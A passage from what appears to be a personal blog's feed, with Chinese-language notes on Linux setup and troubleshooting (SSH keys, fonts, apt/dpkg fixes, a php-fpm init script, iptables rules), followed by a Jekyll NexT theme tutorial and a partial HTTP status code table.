id_rsa 7.在第8步的窗口（当前目录在.ssh）中输入 cat id_rsa.pub &amp;gt;&amp;gt; authorized_keys 8.输入 ssh localhost 启动SSH 参考资料 1.Cygwin-Official Site:http://cygwin.com/ 2.Cygwin-Wikipedia:https://en.wikipedia.org/wiki/Cygwin 3.Cygwin-百度百科：http://baike.baidu.com/view/3968.htm 4.Cygwin在线安装指南：http://www.crifan.com/files/doc/docbook/cygwin_intro/release/htmls/install_cygwin_setup_exe.html 5.8.18 Wps for Linux 1. 从官网下载安装包，网址：http://www.wps.cn/ 2. 安装 $ sudo dpkg -i wps_office_10.xxx.deb 3. 安装完成后，提示“系统缺失字体symbol、wingdings、wingdings 2、wingdings 3、webding”的解决办法： 1) 下载缺失的字体文件，然后复制到Linux系统中的/usr/share/fonts文件夹中。 国外下载地址：https://www.dropbox.com/s/lfy4hvq95ilwyw5/wps_symbol_fonts.zip 国内下载地址：http://pan.baidu.com/s/1mh0lcbY 或者直接 在win 中（C/WINDOWS/FONTS） 2) 执行以下命令,生成字体的索引信息： $ sudo mkfontscale $ sudo mkfontdir 3) 运行fc-cache命令更新字体缓存 $ sudo fc-cache 5.8.19 gnome-screenshots 常用快捷键 Prt Scrn to take a screenshot of the desktop. Alt+Prt Scrn to take a screenshot of a window. Shift+Prt Scrn to take a screenshot of an area you select. 参考资料(References) Screenshots and screencasts 6 Problem 6.1 命令行下不能输入中文标点符号 使用快捷键 Ctrl+. 一个是lation 符号，一个是全角符号。 6.2 不能在 Sublime 编辑器（Editor）中输入中文 下载（Download） $ git clone https://github.com/lyfeyaj/sublime-text-imfix.git 配置（Configure） $ cd ~/sublime-text-imfix $ sudo cp ./lib/libsublime-imfix.so /opt/sublime_text/ $ sudo cp ./src/subl /usr/bin/ $ LD_PRELOAD=./libsublime-imfix.so subl 新建Shell脚本 $ vim /home/zrg/sublime #!/bin/bash LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so subl 参考资料 http://www.jianshu.com/p/bf05fb3a4709 6.3 解决系统不能支持加密算法：chacha20 $ sudo apt-get install m2crypto gcc -y $ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz $ tar zxvf libsodium-1.0.8.tar.gz $ cd libsodium-1.0.8 $ ./configure $ sudo make &amp;amp;&amp;amp; make install $ sudo echo &quot;include ld.so.conf.d/*.conf&quot;&amp;gt;/etc/ld.so.conf $ sudo echo &quot;/lib&quot;&amp;gt;&amp;gt;/etc/ld.so.conf $ sudo echo &quot;/usr/lib64&quot;&amp;gt;&amp;gt;/etc/ld.so.conf $ sudo echo &quot;/usr/local/lib&quot;&amp;gt;&amp;gt;/etc/ld.so.conf $ ldconfig 6.4 软件源配置不全，导致软件不能安装 //Error: Can't fix the error because you are asking some packages to stay the same, that is they break the dependencies between the packages. //翻译：无法修正错误,因为您要求某些软件包保持现状,就是它们破坏了软件包间的依赖关系 //解决：检查安装源，进行重新配置，必要时添加debian官方安装源 $ vim /etc/apt/sources.list $ sudo apt-get update 6.5 .deb 转换为 .rpm 6.5.1 下载及安装 alien 1.下载: $ wget https://packages.debian.org/unstable/source/alien 2.安装: $ tar xpvf alien_8.95.tar.xz $ cd alien-8.95 $ make &amp;amp;&amp;amp; make install 6.5.2 转换(Conversion) $ alien -r kuaipan4uk_2.0.0.5_amd64.deb 6.6 软件自启动脚本实例 6.6.1 实例：php-fpm 服务启动脚本 $ sudo vim /etc/init.d/php-fpm #!/bin/sh # DateTime:2017-03-09 # Author:zrg # chkconfig: - 84 16 . /etc/rc.d/init.d/functions # Source networking configuration. . /etc/sysconfig/network # Check that networking is up. [ &quot;$NETWORKING&quot; = &quot;no&quot; ] &amp;amp;&amp;amp; exit 0 phpfpm=&quot;/usr/local/php/sbin/php-fpm&quot; prog=$(basename ${phpfpm}) lockfile=/var/lock/subsys/phpfpm start() { [ -x ${phpfpm} ] || exit 5 echo -n $&quot;Starting $prog: &quot; daemon ${phpfpm} retval=$? echo [ $retval -eq 0 ] &amp;amp;&amp;amp; touch $lockfile return $retval } stop() { echo -n $&quot;Stopping $prog: &quot; killproc $prog -QUIT retval=$? echo [ $retval -eq 0 ] &amp;amp;&amp;amp; rm -f $lockfile return $retval } restart() { configtest || return $? stop start } reload() { configtest || return $? echo -n $&quot;Reloading $prog: &quot; killproc ${phpfpm} -HUP RETVAL=$? echo } force_reload() { restart } configtest() { ${phpfpm} -t } rh_status() { status $prog } rh_status_q() { rh_status &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 } case &quot;$1&quot; in start) rh_status_q &amp;amp;&amp;amp; exit 0 $1 ;; stop) rh_status_q || exit 0 $1 ;; restart|configtest) $1 ;; reload) rh_status_q || exit 7 $1 ;; status) rh_status ;; *) echo $&quot;Usage: $0 {start|stop|status|restart|reload|configtest}&quot; exit 2 esac 脚本说明： # Source function library. . /etc/rc.d/init.d/functions //类似于include,require，引入文件。 # Source networking configuration. . /etc/sysconfig/network //同理。 //引入后，用到的daemon、status NETWORKING=yes HOSTNAME=E10162 //将他们作为变量赋值,判断网卡是否启动，如果你的 nginx 不走网卡，其实网络这段可以去掉 //daemon便是实现上图漂亮的【 OK 】的函数. 2.设置自启动 # php-fpm 加入服务 chkconfig --add php-fpm # php-fpm 234 级别下设置为启动 chkconfig php-fpm on # 查看 php-fpm 服务当前配置 chkconfig --list php-fpm php-fpm 0:off 1:off 2:on 3:on 4:on 5:on 6:off 3.php-fpm操作 # 启动/关闭/重启/重载 service php-fpm start/stop/restart/reload # 检查配置文件 #service php-fpm configtest 6.6.2 References http://www.ttlsa.com/php/php-fpm-service-scripts/ 6.7 解决 dpkg: warning: files list file for package 'x' missing 问题 Listing 3: for package in $(apt-get upgrade 2&amp;gt;&amp;amp;1 |\ grep &quot;warning: files list file for package '&quot; |\ grep -Po &quot;[^'\n ]+'&quot; | grep -Po &quot;[^']+&quot;); do apt-get install --reinstall &quot;$package&quot;; done 6.8 dpkg: error: failed to open package info file `/var/lib/dpkg/available' for reading $ sudo dpkg --configure -a $ sudo apt-get -f install $ sudo apt-get --fix-missing install $ sudo apt-get clean $ sudo apt-get update $ sudo apt-get upgrade $ sudo apt-get dist-upgrade $ sudo apt-get clean $ sudo apt-get autoremove 6.9 CentOS 7关闭firewall，安装iptables 1. 查看安装和状态 $ yum installed firewalld iptables $ systemctl list-unit-files firewalld.service iptables.service 2. 停止并禁止自启动firewall和安装iptables防火墙 $ systemctl stop firewalld.service $ systemctl disable firewalld.service $ yum install iptables-service $ systemctl enable iptables.service 3. 编辑并修改配置文件/etc/sysconfig/iptables，使用如下配置 *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :TEST - [0:0] -A INPUT -j TEST -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A INPUT -p icmp -j ACCEPT -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -i eth1 -d 192.168.1.100 --syn -m recent --name suduip --rcheck --seconds 1 --hitcount 15 -j DROP -A INPUT -p tcp -i eth1 -d 192.168.1.100 --syn -m recent --name suduip --set -A INPUT -i eth1 -p tcp -m tcp -d 192.168.1.100 --syn -m connlimit --connlimit-above 50 --connlimit-mask 32 --connlimit-saddr -j DROP #-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG SYN -m length --length 0:128 -j ACCEPT -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT ... ... -A INPUT -j DROP -A INPUT -j REJECT --reject-with icmp-host-prohibited -A FORWARD -j TEST -A FORWARD -j REJECT --reject-with icmp-host-prohibited -A OUTPUT -j TEST -A TEST -j RETURN COMMIT 4. 查看防火墙规则是否启用。 $ iptables -L</summary></entry><entry><title type="html">Customize my own theme tutorial with Next Theme</title><link href="http://localhost:4000/jekyll/2018/08/05/next-tutorial/" rel="alternate" type="text/html" title="Customize my own theme tutorial with Next Theme" /><published>2018-08-05T00:00:00+08:00</published><updated>2018-08-05T00:00:00+08:00</updated><id>http://localhost:4000/jekyll/2018/08/05/next-tutorial</id><content type="html" xml:base="http://localhost:4000/jekyll/2018/08/05/next-tutorial/">&lt;h2 id=&quot;preface&quot;&gt;Preface&lt;/h2&gt;
&lt;p&gt;NexT theme from &lt;a href=&quot;https://github.com/iissnan/hexo-theme-next&quot;&gt;Hexo NexT&lt;/a&gt;, and this site build  with org-mode. The following are some references:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll Official Site&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://theme-next.simpleyyt.com/&quot;&gt;NexT theme&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simpleyyt.github.io/jekyll-theme-next/&quot;&gt;Live Preview&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://simpleyyt.com/&quot;&gt;Yitao’s Blog&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://theme-next.simpleyyt.com/&quot;&gt;NexT 使用文档 &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://help.github.com/articles/setting-up-your-github-pages-site-locally-with-jekyll/&quot;&gt;Setting up your GitHub Pages site locally with Jekyll&lt;/a&gt;
    &lt;h2 id=&quot;installation&quot;&gt;Installation&lt;/h2&gt;
    &lt;ol&gt;
      &lt;li&gt;Check whether you have &lt;code class=&quot;highlighter-rouge&quot;&gt;Ruby 2.1.0&lt;/code&gt; or higher installed:
        &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;Install &lt;code class=&quot;highlighter-rouge&quot;&gt;Bundler&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Jekyll&lt;/code&gt;:
        &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gem install bundler jekyll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;Clone:
        &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/zhaorengui/zhaorengui.github.io.git
  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;jekyll-theme-next
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;Install dependencies packages:
        &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bundle install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;Running your Jekyll site locally:
        &lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;jekyll server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;p&gt;Access http://localhost:4000 on browser.&lt;/p&gt;
        &lt;h2 id=&quot;diretory-structure&quot;&gt;Diretory Structure&lt;/h2&gt;
        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;├─_data		数据目录
│  ├─languages	语言目录
├─_drafts	(预发布)草稿目录
├─_include	固定文件模板引用目录
├─_orgs		org文件目录
│  ├─_assets	资源目录，img,js,css,...
│  ├─_drafts	org草稿目录
│  ├─_posts	org发布目录
├─_posts	文章目录，皆是html文件
├─_sass		scss文件目录
├─_site		站点访问目录
├─about		关于目录
├─archives	归档目录
├─assets	资源目录
├─categories	分类目录
├─tag		标签目录
├─tags		标签目录
├─404.html	404页面
├─Gemfile	jekyll文件	
├─Gemfile.lock	jekyll文件
├─README.en.md	英文说明文件
├─README.md	说明文件
├─_config.yml	配置文件
├─index.html	入口文件
└─search.xml	搜索配置文件
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;h2 id=&quot;name&quot;&gt;Name&lt;/h2&gt;
      &lt;/li&gt;
      &lt;li&gt;分类命名：英文名称全部小写，如algorithms，c#，javascript等。两个单词以上组成，采用-字符连接。分类名称不能重名。&lt;/li&gt;
      &lt;li&gt;标签命名：与实际常见命名一致，如MySQL，PHP，Jekyll等。另外一些两个单词以上组成的术语，建议采用-字符连接，如Design-Pattern。&lt;/li&gt;
      &lt;li&gt;org 源文件命名：日期+文件描述名称，文件描述名称采用-字符连接，如2018-12-12-vue-iview.org。&lt;/li&gt;
      &lt;li&gt;org 发布目录命名：采用驼峰法命名。
        &lt;h2 id=&quot;org&quot;&gt;.org&lt;/h2&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;screenshots&quot;&gt;Screenshots&lt;/h2&gt;

&lt;h2 id=&quot;browser-support&quot;&gt;Browser support&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://iissnan.com/nexus/next/browser-support.png&quot; alt=&quot;Browser support&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;contributing&quot;&gt;Contributing&lt;/h2&gt;
&lt;p&gt;Welcome you submit issues.&lt;/p&gt;</content><author><name>zrg</name></author><category term="jekyll" /><category term="NexT" /><summary type="html">Preface NexT theme from Hexo NexT, and this site build with org-mode. The following are some references: Jekyll Official Site NexT theme Live Preview Yitao’s Blog NexT 使用文档 Setting up your GitHub Pages site locally with Jekyll Installation Check whether you have Ruby 2.1.0 or higher installed: $ ruby --version Install Bundler and Jekyll: $ gem install bundler jekyll Clone: $ git clone https://github.com/zhaorengui/zhaorengui.github.io.git $ cd jekyll-theme-next Install dependencies packages: $ bundle install Running your Jekyll site locally: $ bundle exec jekyll server Access http://localhost:4000 on browser. Diretory Structure ├─_data 数据目录 │ ├─languages 语言目录 ├─_drafts (预发布)草稿目录 ├─_include 固定文件模板引用目录 ├─_orgs org文件目录 │ ├─_assets 资源目录，img,js,css,... │ ├─_drafts org草稿目录 │ ├─_posts org发布目录 ├─_posts 文章目录，皆是html文件 ├─_sass scss文件目录 ├─_site 站点访问目录 ├─about 关于目录 ├─archives 归档目录 ├─assets 资源目录 ├─categories 分类目录 ├─tag 标签目录 ├─tags 标签目录 ├─404.html 404页面 ├─Gemfile jekyll文件 ├─Gemfile.lock jekyll文件 ├─README.en.md 英文说明文件 ├─README.md 说明文件 ├─_config.yml 配置文件 ├─index.html 入口文件 └─search.xml 搜索配置文件 Name 分类命名：英文名称全部小写，如algorithms，c#，javascript等。两个单词以上组成，采用-字符连接。分类名称不能重名。 标签命名：与实际常见命名一致，如MySQL，PHP，Jekyll等。另外一些两个单词以上组成的术语，建议采用-字符连接，如Design-Pattern。 org 源文件命名：日期+文件描述名称，文件描述名称采用-字符连接，如2018-12-12-vue-iview.org。 org 发布目录命名：采用驼峰法命名。 .org Screenshots Browser support Contributing Welcome you submit issues.</summary></entry><entry><title type="html">HTTP Error 代码释义表</title><link href="http://localhost:4000/network/2018/01/27/http-error/" rel="alternate" type="text/html" title="HTTP Error 代码释义表" /><published>2018-01-27T00:00:00+08:00</published><updated>2018-01-27T00:00:00+08:00</updated><id>http://localhost:4000/network/2018/01/27/http-error</id><content type="html" xml:base="http://localhost:4000/network/2018/01/27/http-error/">&lt;div id=&quot;outline-container-orgf967d2c&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgf967d2c&quot;&gt;2xx：成功&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-orgf967d2c&quot;&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;Code&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;200&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常：请求已完成。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;201&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常：请求成功并且服务器创建了新的资源。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;202&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常：服务器已接受请求，但尚未处理。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;203&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常：服务器已成功处理了请求，但返回的信息可能来自另一来源。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;204&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常：服务器成功处理了请求，但没有返回任何内容。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;205&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常：服务器成功处理了请求，但没有返回任何内容。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;206&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;正常：服务器成功处理了部分 GET 请求。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org090e518&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org090e518&quot;&gt;3xx：重定向&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org090e518&quot;&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;Code&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;301&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;已移动 — 请求的数据具有新的位置且更改是永久的。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;302&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;已找到 — 请求的数据临时具有不同 URI。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;303&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;请参阅其它 — 可在另一 URI 下找到对请求的响应，且应使用 GET 方法检索此响应。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;304&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未修改 — 未按预期修改文档。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;305&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;使用代理 — 必须通过位置字段中提供的代理来访问请求的资源。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;306&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未使用 — 不再使用；保留此代码以便将来使用。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org58bf74c&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org58bf74c&quot;&gt;4xx：客户端出现的错误&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org58bf74c&quot;&gt;
&lt;p&gt;
表1：
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;Code&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;Descriptiono&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;400&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;错误请求 — 请求中有语法问题，或不能满足请求。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;401&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;402&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;需要付款 — 表示计费系统已有效。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止 — 服务器拒绝请求。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;404&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未找到 — 服务器找不到请求的网页。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;405&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁用 — 禁用请求中指定的方法。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;406&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;不接受 — 无法使用请求的内容特性响应请求的网页。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;407&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;需要代理授权 — 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;408&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;请求超时 — 服务器等候请求时发生超时。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;409&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;冲突 — 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;410&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;已删除 — 如果请求的资源已永久删除，服务器就会返回此响应。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;411&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;需要有效长度 — 服务器不接受不含有效内容长度标头字段的请求。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;412&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未满足前提条件 — 服务器未满足请求者在请求中设置的其中一个前提条件。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;413&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;请求实体过大 — 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;414&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;请求的 URI 过长 — 请求的 URI（通常为网址）过长，服务器无法处理。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;415&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;不支持的媒体类型 — 请求的格式不受请求页面的支持。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;416&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;请求范围不符合要求 — 如果页面无法提供请求的范围，则服务器会返回此状态代码。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;417&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未满足期望值 — &amp;gt;服务器未满足”期望”请求标头字段的要求。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
表2：
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;Code&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;401.1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未授权：登录失败&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;401.2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未授权：服务器配置问题导致登录失败&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;401.3&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;ACL 禁止访问资源&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;401.4&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未授权：授权被筛选器拒绝&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;401.5&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未授权：ISAPI 或 CGI 授权失败&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：禁止可执行访问&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：禁止读访问&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.3&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：禁止写访问&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.4&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：要求 SSL&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.5&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：要求 SSL 128&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.6&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;禁止访问：IP 地址被拒绝&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;403.7&lt;/td&gt;
